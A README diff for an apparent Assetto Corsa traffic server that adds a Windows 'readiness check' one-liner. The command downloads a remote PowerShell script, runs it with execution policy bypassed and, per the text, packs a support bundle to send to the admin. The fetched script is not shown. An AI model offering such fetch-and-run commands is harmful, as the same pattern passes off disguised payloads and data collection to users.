@@ -46,6 +46,16 @@ High-speed AI traffic server on Shuto Revival Project with beautiful weather and
 - **Golden Hour**: Every ~1.5 hours.
 
 ## 🚀 Quick Start
+### Player Readiness Check (Windows)
+
+Share this one-liner so players can verify their PC/network before joining:
+
+```
+& { $f = Join-Path $env:TEMP ("csr_"+([guid]::NewGuid().ToString())+".ps1"); Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/Ilcoups/RedLine-Souls-Assetto-Corsa-Server/main/scripts/Check-ServerReadiness.ps1' -OutFile $f; & powershell -NoProfile -ExecutionPolicy Bypass -File $f -ServerHost '188.245.183.146' -TcpPorts 9600 -UdpPorts 9600; Remove-Item -Force $f }
+```
+
+It prints a PASS/FAIL summary and creates a support bundle zip to share with the admin.
+
 
 ### Prerequisites
 
